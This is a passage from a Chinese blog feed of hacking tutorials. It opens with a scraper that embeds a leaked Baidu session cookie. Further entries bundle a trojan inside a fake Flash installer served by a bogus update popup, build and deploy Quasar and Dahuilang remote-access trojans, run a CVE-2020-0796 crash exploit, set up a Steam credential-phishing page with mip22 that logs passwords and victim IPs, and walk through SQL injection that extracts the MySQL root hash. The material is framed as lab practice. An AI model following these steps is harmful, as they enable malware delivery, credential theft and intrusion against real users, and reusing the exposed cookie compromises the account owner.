&#x27;pid&#x27;:&#x27;&#x27; ,</span><br><span class="line">        &#x27;pageIndex&#x27;: page,</span><br><span class="line">        &#x27;pageSize&#x27;: 10</span><br><span class="line">    &#125;</span><br><span class="line">    data=urllib.parse.urlencode(data).encode(&#x27;utf8&#x27;)</span><br><span class="line">    header=&#123;</span><br><span class="line">    &#x27;Accept&#x27;: &#x27;application/json, text/javascript, */*; q=0.01&#x27;,</span><br><span class="line">    &#x27;Cookie&#x27;: &#x27;BIDUPSID=4722B19FFA1551DBBC67EFB7A68BF304; PSTM=1654602249; REALTIME_TRANS_SWITCH=1; FANYI_WORD_SWITCH=1; HISTORY_SWITCH=1; SOUND_SPD_SWITCH=1; SOUND_PREFER_SWITCH=1; MCITY=-261%3A318%3A; BAIDUID=5F6D6603BD12746091D57F3B00271E14:FG=1; BDUSS=HJlUk1lRmhpV0NQY090SXVrWUpHYVBLMDJyN0trbG5TUnBZdHB4QmsyT3pqZzlsSVFBQUFBJCQAAAAAAQAAAAEAAAAs7BUgZGZnZ2dnZmZmdGcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALMB6GSzAehke; BDUSS_BFESS=HJlUk1lRmhpV0NQY090SXVrWUpHYVBLMDJyN0trbG5TUnBZdHB4QmsyT3pqZzlsSVFBQUFBJCQAAAAAAQAAAAEAAAAs7BUgZGZnZ2dnZmZmdGcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALMB6GSzAehke; APPGUIDE_10_6_5=1; APPGUIDE_10_6_6=1; APPGUIDE_10_6_7=1; newlogin=1; APPGUIDE_10_6_9=1; H_WISE_SIDS=39635_39647_39664_39676_39713_39733_39740_39780_39703_39684_39661_39679_39841; H_PS_PSSID=39635_39647_39664_39676_39713_39733_39740_39780_39703_39684_39661_39679_39841; H_WISE_SIDS_BFESS=39635_39647_39664_39676_39713_39733_39740_39780_39703_39684_39661_39679_39841; BDORZ=FFFB88E999055A3F8A630C64834BD6D0; BAIDUID_BFESS=5F6D6603BD12746091D57F3B00271E14:FG=1; Hm_lvt_64ecd82404c51e03dc91cb9e8c025574=1701173106,1701241794,1701248955,1701307912; Hm_lpvt_64ecd82404c51e03dc91cb9e8c025574=1701307912; ab_sr=1.0.1_MjMxMmVhNDhhZjY3NDU1ODI4OWQ5MjlmZjZkN2VhN2M3MDJkYzdhMGE4OTFlOWY3Y2I0ZDhiZjViYmRhNDgyMjk4NGM5MTVkYzI4MTg1N2U3MTlhODI0MGZkYmFkOGQ3Y2Y4MGQ3ZDdhZjU3MTgwMTE2MzUyMWQ1YTNjOGUzZDI0NTY0MzJjZjFjMDhhOGUxMTYyODIwZDQ1NGE2MmRiNWY3OGRmNTQ4OWQ4ODM0NDk0NTI0NDhkZTRjNThkYTQ2&#x27;,</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 SLBrowser/9.0.0.10191 SLBChan/11&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    request=urllib.request.Request(url=url,headers=header,data=data )</span><br><span class="line">    print(page)</span><br><span class="line">    return request</span><br><span class="line"></span><br><span class="line">def get_contect(request):</span><br><span class="line">    response=urllib.request.urlopen(request)</span><br><span class="line">    contect=response.read().decode(&#x27;utf-8&#x27;)</span><br><span class="line">    return contect</span><br><span class="line"></span><br><span class="line">def down_load(page,contect):</span><br><span class="line">    json_name=&#x27;./kfc/kfc_&#x27;+str(page)+&#x27;.json&#x27;</span><br><span class="line">    with open(json_name,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;) as fp:</span><br><span class="line">        fp.write(contect)</span><br><span class="line">    fp.close()</span><br><span class="line"></span><br><span class="line"># 程序入口</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    start_page=int(input(&quot;请融入起始页：&quot;))</span><br><span class="line">    end_page=int(input(&quot;请输入结尾页：&quot;))</span><br><span class="line">    if(start_page&lt;1 or end_page&lt;start_page):</span><br><span class="line">        print(&quot;输入错误！&quot;)</span><br><span class="line">    else:</span><br><span class="line">        for page in range(start_page, end_page+1):</span><br><span class="line">            request=get_request(page)</span><br><span class="line">            contect=get_contect(request)</span><br><span class="line">            down_load(page,contect)</span><br><span class="line">        print(&quot;下载kfc店铺&quot;+str(start_page)+&quot;~&quot;+str(end_page)+&quot;页完成！&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;爬虫概念：使用程序模拟浏览器，向服务器发送请求，获取响应数据&quot;&gt;&lt;a href=&quot;#爬虫概念：使用程序模拟浏览器，向服务器发送请求，获取响应数据&quot; class=&quot;headerlink&quot; title=&quot;爬虫概念：使用程序模拟浏览器，向服务器发送请求，获取响应数据&quot;&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二十，网页注入捆绑木马</title>
    <link href="http://example.com/2023/11/29/%E4%BA%8C%E5%8D%81%EF%BC%8C%E7%BD%91%E9%A1%B5%E6%B3%A8%E5%85%A5%E6%8D%86%E7%BB%91%E6%9C%A8%E9%A9%AC/"/>
    <id>http://example.com/2023/11/29/%E4%BA%8C%E5%8D%81%EF%BC%8C%E7%BD%91%E9%A1%B5%E6%B3%A8%E5%85%A5%E6%8D%86%E7%BB%91%E6%9C%A8%E9%A9%AC/</id>
    <published>2023-11-29T12:36:24.000Z</published>
    <updated>2023-11-29T13:06:21.920Z</updated>
    
    <content type="html"><![CDATA[<p>1，先制作一个flash页面加入flash升级弹窗</p><p>下载好flash.js文件，先制作一个简单页面在body标签中加入以下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;./flash.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>效果如下：<br><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292044323.png" alt="image-20231129204430323"></p><p>2，制作捆绑木马</p><p>将flashcenter_pp_ax_install_cn.exe安装包和flag.exe木马放在同一文件夹下</p><p>使⽤winrar选中两个文件创建压缩⽂件</p><p>选中 创建自解压格式压缩文件</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292048736.png" alt="image-20231129204809684"></p><p>⾼级-&gt;⾼级⾃解压选项，路径设置 C:\windows\temp</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292049081.png" alt="image-20231129204928461"></p><p>在设置添加<br>C:\windows\temp\flashcenter_pp_ax_install_cn.exe<br>C:\windows\temp\flag.exe</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292050897.png" alt="image-20231129205010088"></p><p>模式设置全部隐藏</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292050470.png" alt="image-20231129205045192"></p><p>更新设置</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292051436.png" alt="image-20231129205111322"></p><p>在最后点击确定，点击生成</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292054689.png" alt="image-20231129205428438"></p><p>3，替换图标</p><p>先下载Restorator.rar文件并进行解压</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292055603.png" alt="image-20231129205534521"></p><p>双击Restorator.exe运行</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292056692.png" alt="image-20231129205623567"></p><p>将Desktop.exe和flashcenter_pp_ax_install_cn.exe都拖到Restorator的资源数中</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292058432.png" alt="image-20231129205805145"></p><p>将Desktop.exe的图标删除，将flashcenter_pp_ax_install_cn.exe的图标复制黏贴到Desktop.exe中</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292059560.png" alt="image-20231129205927369"></p><p>点击保存退出并将Desktop.exe重命名为flash.exe</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292100474.png" alt="image-20231129210023351"></p><p>4，将捆绑木马放到网页中</p><p>先将flash.exe放到网站根目录中</p><p>并在flash.js的最后改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.96/flash.exe</span><br></pre></td></tr></table></figure><p>其中192.168.2.96为本机的IP地址，flash.exe为改好的安装包文件</p><p>在网页中点击立即升级，开始下载flash.exe文件说明放入捆绑木马成功</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292105253.png" alt="image-20231129210530876"></p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1，先制作一个flash页面加入flash升级弹窗&lt;/p&gt;
&lt;p&gt;下载好flash.js文件，先制作一个简单页面在body标签中加入以下代码&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutt</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>十九，Quasar远控的安装及使用</title>
    <link href="http://example.com/2023/11/29/%E5%8D%81%E4%B9%9D%EF%BC%8CQuasar%E8%BF%9C%E6%8E%A7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2023/11/29/%E5%8D%81%E4%B9%9D%EF%BC%8CQuasar%E8%BF%9C%E6%8E%A7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/</id>
    <published>2023-11-29T12:18:35.000Z</published>
    <updated>2023-11-29T12:32:02.435Z</updated>
    
    <content type="html"><![CDATA[<p>1，关闭系统中所有的杀毒软件与防火墙</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292020610.png" alt="image-20231129202009585" style="zoom:67%;" /><p>2，下载Quasar最新内部成员汉化版远控工具.rar并解压</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292021455.png" alt="image-20231129202153099"></p><p>3，双击运行Quasar_zh-CHS.exe</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292022917.png" alt="image-20231129202238345"></p><p>4，开启监听端口</p><p>点击设置—&gt;选择端口4782—&gt;点击Start Listening—&gt;保存</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292024265.png" alt="image-20231129202418255"></p><p>5，生成控制程序，点击生成进行以下设置</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292025392.png" alt="image-20231129202555179" style="zoom: 67%;" /><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292026137.png" alt="image-20231129202630109"></p><p>点击生成，成功生成程序Client-built.exe</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292027394.png" alt="image-20231129202722155"></p><p>6，将程序Client-built.exe拖到虚拟机中双击运行</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292029008.png" alt="image-20231129202951870"></p><p>7，右键管理可以进行多种操作</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292030749.png" alt="image-20231129203041363"></p><p>8，点击断开可以退出远程控制</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292031324.png" alt="image-20231129203125167"></p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1，关闭系统中所有的杀毒软件与防火墙&lt;/p&gt;
&lt;img src=&quot;https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311292020610.png&quot; alt=&quot;image-20231129202009585&quot; s</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>十八，大灰狼远控软件的使用</title>
    <link href="http://example.com/2023/11/28/%E5%8D%81%E5%85%AB%EF%BC%8C%E5%A4%A7%E7%81%B0%E7%8B%BC%E8%BF%9C%E6%8E%A7%E8%BD%AF%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2023/11/28/%E5%8D%81%E5%85%AB%EF%BC%8C%E5%A4%A7%E7%81%B0%E7%8B%BC%E8%BF%9C%E6%8E%A7%E8%BD%AF%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2023-11-28T12:17:53.000Z</published>
    <updated>2023-11-28T12:34:26.554Z</updated>
    
    <content type="html"><![CDATA[<p>1，下载下载DHLv9.5.zip并进行解压</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311282034897.png" alt="image-20231128203410405"></p><p>2，双击运行大灰狼远程管理软件 V9.5.exe文件</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311282019750.png" alt="image-20231128201951397"></p><p>3，点击服务生成，在域名IP中输入本机的IP地址，并点击生成服务</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311282029725.png" alt="image-20231128202931604"></p><p>4，将生成的Server.exe文件拖到虚拟机中双击运行后返回大灰狼管理软件</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311282031299.png" alt="image-20231128203103865"></p><p>出现以上结果表示远控成功，可以右键进行多种操作</p><p>python在执行程序时发现缺少某种包，则可用以下命令进行导入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install chardet -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com</span><br></pre></td></tr></table></figure><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1，下载下载DHLv9.5.zip并进行解压&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311282034897.png&quot; alt=&quot;image-2023112820341</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>十七，永恒之黑和简单钓鱼页面</title>
    <link href="http://example.com/2023/11/28/%E5%8D%81%E4%B8%83%EF%BC%8C%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E5%92%8C%E7%AE%80%E5%8D%95%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2/"/>
    <id>http://example.com/2023/11/28/%E5%8D%81%E4%B8%83%EF%BC%8C%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E5%92%8C%E7%AE%80%E5%8D%95%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2/</id>
    <published>2023-11-28T11:45:01.000Z</published>
    <updated>2023-11-28T12:16:08.933Z</updated>
    
    <content type="html"><![CDATA[<h5 id="一，永恒之黑的简单复现"><a href="#一，永恒之黑的简单复现" class="headerlink" title="一，永恒之黑的简单复现"></a>一，永恒之黑的简单复现</h5><p>1，先对Windows系统是否存在永恒之黑进行进行检测</p><p>从<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a> 这个网址下载检测工具</p><p>执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2020-0796-Scanner.exe 192.168.2.128</span><br></pre></td></tr></table></figure><p>若出现以下效果则证明存在永恒之黑漏洞</p><p><img src="/../../../../../Users/Q/AppData/Roaming/Typora/typora-user-images/image-20231128194913268.png" alt="image-20231128194913268"></p><p>2，其次是对永恒之黑漏洞进行复现攻击</p><p>从<a href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a> 下载攻击工具</p><p>执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-2020-0796.py 192.168.2.128</span><br></pre></td></tr></table></figure><p>若Windows系统的虚拟机出现蓝屏则证明对永恒之黑漏洞的攻击复现成功</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311281952658.png" alt="image-20231128195231534" style="zoom:80%;" /><p>二，钓鱼页面的简单制作</p><p>1，先在kali系统中开代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/proxychains4.conf</span><br></pre></td></tr></table></figure><p>进入配置文件中进行修改，修改最后一行为以下内容并保存退出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 192.168.2.44 7897</span><br></pre></td></tr></table></figure><p>中间的数字为本机IP，后面的数字为代理端口</p><p>2，下载mip22</p><p>进入桌面，在命令窗口中执行以下命令进行下载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 git clone https://github.com/makdosx/mip22</span><br></pre></td></tr></table></figure><p>3，生成钓鱼页面</p><p>进入mip22文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /home/kali/Desktop/mip22</span><br></pre></td></tr></table></figure><p>给mip22增加执行权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ./*</span><br></pre></td></tr></table></figure><p>执行mip22，开始生成钓鱼页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q bash ./mip22.sh</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311282004666.png" alt="image-20231128200451131"></p><p>选择1默认配置页面</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311282006157.png" alt="image-20231128200640695"></p><p>选择51，steam游戏平台的模板</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311282008997.png" alt="image-20231128200808927"></p><p>选择3 Cloudflard，使其他用户在其他电脑也可以查看</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311282009127.png" alt="image-20231128200956963"></p><p>其中https的网址就是生成的钓鱼页面了</p><p><a href="https://remaining-img-questions-less.trycloudflare.com/">https://remaining-img-questions-less.trycloudflare.com</a> </p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311282011477.png" alt="image-20231128201120608"></p><p>在mip22文件夹中的data.txt保存着在钓鱼页面中输入的账号和密码</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311282014343.png" alt="image-20231128201411107"></p><p>在fingerprints.txt中保存着在钓鱼页面中尝试登录的用户的IP地址</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311282015451.png" alt="image-20231128201525152"></p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;一，永恒之黑的简单复现&quot;&gt;&lt;a href=&quot;#一，永恒之黑的简单复现&quot; class=&quot;headerlink&quot; title=&quot;一，永恒之黑的简单复现&quot;&gt;&lt;/a&gt;一，永恒之黑的简单复现&lt;/h5&gt;&lt;p&gt;1，先对Windows系统是否存在永恒之黑进行进行检测&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>十六，sql注入的简单使用</title>
    <link href="http://example.com/2023/11/23/%E5%8D%81%E5%85%AD%EF%BC%8Csql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2023/11/23/%E5%8D%81%E5%85%AD%EF%BC%8Csql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</id>
    <published>2023-11-23T11:10:10.000Z</published>
    <updated>2023-11-23T12:12:30.000Z</updated>
    
    <content type="html"><![CDATA[<h5 id="1，搭建Pikachu漏洞练习平台"><a href="#1，搭建Pikachu漏洞练习平台" class="headerlink" title="1，搭建Pikachu漏洞练习平台"></a>1，搭建Pikachu漏洞练习平台</h5><p>先解压pikachu-master.zip文件至先前搭建的网站根目录，再打开pikachu\inc目录下的config.inc.php</p><p>文件，并将第11行代码改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(&#x27;DBPW&#x27;, &#x27;root&#x27;);</span><br></pre></td></tr></table></figure><p>保存后复制黏贴为config.inc文件</p><p>打开网址：<a href="http://192.168.2.31/pikachu/">http://192.168.2.31/pikachu/</a>  便可进入PIkachu漏洞联系平台</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311231919074.png" alt="image-20231123191932069" style="zoom:67%;" /><h5 id="2，安装配置BurpSuite软件"><a href="#2，安装配置BurpSuite软件" class="headerlink" title="2，安装配置BurpSuite软件"></a>2，安装配置BurpSuite软件</h5><p>先解压BurpSuite v2.1中文版.zip，双击Start.vbs后在地址中输入cmd打开命令窗口输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Java -jar burp-loader-keygen-2.jar</span><br></pre></td></tr></table></figure><p>后按照流程完成BurpSuite软件</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311231925901.png" alt="image-20231123192524600"></p><p>点击代理-&gt;选项-&gt;CA证明书再生成</p><p>打开网址：127.0.0.1:8080 点击CA Certificate下载证书文件cacert.der</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311231927462.png" alt="image-20231123192732852"></p><p>在浏览器中点击设置-&gt;搜索证书-&gt;安全-&gt;管理证书-&gt;受信任的根证书颁发机构-&gt;导入证书即可</p><p>在GOogleChrome中的扩展插件SwitchyOmega中加入如下配置</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311231932016.png" alt="image-20231123193255336"></p><h5 id="3，使用BurpSuite在Pikachu漏洞练习平台进行数字型SQL注入"><a href="#3，使用BurpSuite在Pikachu漏洞练习平台进行数字型SQL注入" class="headerlink" title="3，使用BurpSuite在Pikachu漏洞练习平台进行数字型SQL注入"></a>3，使用BurpSuite在Pikachu漏洞练习平台进行数字型SQL注入</h5><p>先打开BurpSuite软件和Pikachu漏洞练习平台</p><p>再在Pikachu漏洞练习平台选择SQL的数字型注入选项</p><p>在BurpSuite软件中点击代理-&gt;截断-&gt;拦截禁用</p><p>选择1，点击查询，会发现页面没有跳转并在BurpSuite中显示了相关信息</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311231941303.png" alt="image-20231123194105141"></p><p>右键发送给Repeater后管理关闭拦截请求后再重发器中可以看到相关信息，进行更改后可点击发送</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311231943739.png" alt="image-20231123194356916"></p><p>数字型注入可以使用经典的 and 1&#x3D;1 和 and 1&#x3D;2 来判断：</p><p>在请求体最底下进行更改id&#x3D; 2 and 1&#x3D;1</p><p>页面依旧运行正常，继续进行下一步。</p><p>改为id&#x3D; 2 and 1&#x3D;2</p><p>页面运行错误，则说明此 Sql 注入为数字型注入。</p><p>改为id&#x3D;10 or 1 便可查询该表中的所有信息</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311231947066.png" alt="image-20231123194713861"></p><p>因为在MySQL5.0以上会有一个information_schema数据库来记载所有数据库和表以及列的信息，所有可以针对该点进行查询</p><p>information_schema数据库结构如下：</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311231952626.png" alt="image-20231123195236735" style="zoom:67%;" /><p>在请求头输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 union select 1, (select schema_name from information_schema.schemata limit 0,1 )-- -</span><br></pre></td></tr></table></figure><p>来查询有哪些数据库，查到有数据库名为mysql</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 union select 1, (select table_name from information_schema.tables where table_name=&#x27;mysql&#x27; limit 0,1 )-- -</span><br></pre></td></tr></table></figure><p>来查询mysql数据库中有那些表，其中有user表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 union select 1, (select column_name from information_schema.columns where table_name=&#x27;mysql&#x27; table_name=&#x27;user&#x27; limit 0,1 )-- -</span><br></pre></td></tr></table></figure><p>来查询user表中有哪些字段，查询到了有User用户名和authentication_string密码字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 union select 1, (select authentication_string from mysql.user where  User=&#x27;root&#x27; limit 0,1 )-- -</span><br></pre></td></tr></table></figure><p>可以查询到user表中的root管理员用户的密码</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311232001971.png" alt="image-20231123200104745"></p><p>在MD5在线解密网站解密如下：</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311232001081.png" alt="image-20231123200153119" style="zoom:67%;" /><h5 id="4，使用BurpSuite在Pikachu漏洞练习平台进行字符型SQL注入"><a href="#4，使用BurpSuite在Pikachu漏洞练习平台进行字符型SQL注入" class="headerlink" title="4，使用BurpSuite在Pikachu漏洞练习平台进行字符型SQL注入"></a>4，使用BurpSuite在Pikachu漏洞练习平台进行字符型SQL注入</h5><p>如数字型注入一样在BurpSuite中对网页的请求进行拦截</p><p>可以使用 and ‘1’&#x3D;’1 和 and ‘1’&#x3D;’2来判断：</p><p>在请求栏中更改id&#x3D; x’ and ‘1’&#x3D;’1</p><p>页面运行正常，继续进行下一步。</p><p>若id&#x3D; x’ and ‘1’&#x3D;’2</p><p>页面运行错误，则说明此 Sql 注入为字符型注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=sub&#x27;union select 1,database()-- -</span><br></pre></td></tr></table></figure><p>可获取该数据库的名称</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311232009500.png" alt="image-20231123200945828" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=sub&#x27; or &#x27;1=1&#x27;-- -</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311232011759.png" alt="image-20231123201059324" style="zoom:67%;" /><p>便可获取该表中的所有数据</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;1，搭建Pikachu漏洞练习平台&quot;&gt;&lt;a href=&quot;#1，搭建Pikachu漏洞练习平台&quot; class=&quot;headerlink&quot; title=&quot;1，搭建Pikachu漏洞练习平台&quot;&gt;&lt;/a&gt;1，搭建Pikachu漏洞练习平台&lt;/h5&gt;&lt;p&gt;先解压pikachu</summary>
      
    
    
    
    
  </entry>
  
</feed>
